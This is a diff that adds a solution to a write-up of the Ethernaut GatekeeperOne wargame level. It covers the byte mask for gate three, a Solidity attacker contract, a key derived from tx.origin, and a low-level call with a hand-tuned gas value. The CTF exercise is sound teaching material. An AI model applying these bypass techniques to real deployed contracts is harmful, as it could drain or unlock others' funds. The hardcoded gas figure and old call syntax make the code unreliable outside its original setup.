@@ -12,3 +12,25 @@ As a non bytecode lord `GateThree` is tough to parse. I've recently been playing
 * (second `require`) - `0x1111111100001111 != 0x00001111`, which is only possible if you keep the preceding values, with the mask `0xFFFFFFFF0000FFFF`
 
 So, we can cover both of those byte masks with the latter, `0xFFFFFFFF0000FFFF`
+
+## Solution
+1. Create a `GateOpener` contract and instantiate the Ethernaut contract
+```javascript
+contract GateOpener {
+    GatekeeperOne gate = GatekeeperOne(<YOUR CONTRACT INSTANCE>);
+}
+```
+2. Create a byte masked key to solve gate three
+```javascript
+    bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
+```
+
+3. Pass enough gas to the contract to pass gate 2
+* The most simple way to get the amount of gas needed is by stepping through the Remix debugger until we get to the opcode that highlights `msg.gas% 8191`
+* Count the remaining gas and work backwards to calculate the correct original gas amount
+```javascript
+function enterGate() public {
+    gate.call.gas(56348)(bytes4(keccak256('enter(bytes8)')), key);
+}
+```
+Call this function and enter the gate!
